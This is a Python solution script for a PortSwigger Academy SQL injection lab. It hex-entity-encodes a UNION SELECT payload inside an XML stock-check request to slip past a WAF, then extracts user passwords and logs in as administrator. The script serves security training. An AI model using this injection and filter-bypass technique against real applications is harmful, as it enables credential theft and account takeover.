#!/usr/bin/env python3
"""
SQL injection with filter bypass via XML encoding
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 18-filter-bypass-via-xml-encoding.md

What this does:
    Hex-entity-encodes every character of a UNION SELECT injection (e.g. 'S'
    becomes &#x53;) and places it inside the storeId element of the stock
    check XML body. The WAF inspects the raw, pre-decode bytes and sees no
    recognizable SQL keywords; the application's XML parser decodes the
    entities back into plain SQL before it reaches the database. Extracts
    username/password pairs and logs in as administrator.

Usage:
    python 18-filter-bypass-via-xml-encoding.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def xml_hex_encode(s: str) -> str:
    return "".join(f"&#x{ord(c):02X};" for c in s)


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    client.get(lab_url)  # seed session cookie

    injection = " UNION SELECT username||'~'||password FROM users"
    encoded = xml_hex_encode(injection)

    payload_xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<stockCheck><productId>1</productId>"
        f"<storeId>1{encoded}</storeId></stockCheck>"
    )
    r = client.post(f"{lab_url}/product/stock", content=payload_xml,
                     headers={"Content-Type": "application/xml"})
    print(f"[*] Response: {r.text[:200]}")

    m = re.search(r'administrator~([a-zA-Z0-9]+)', r.text)
    if not m:
        print("[-] Could not find administrator's row in the response.")
        return
    admin_pass = m.group(1)
    print(f"[+] administrator's password: {admin_pass}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": admin_pass, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
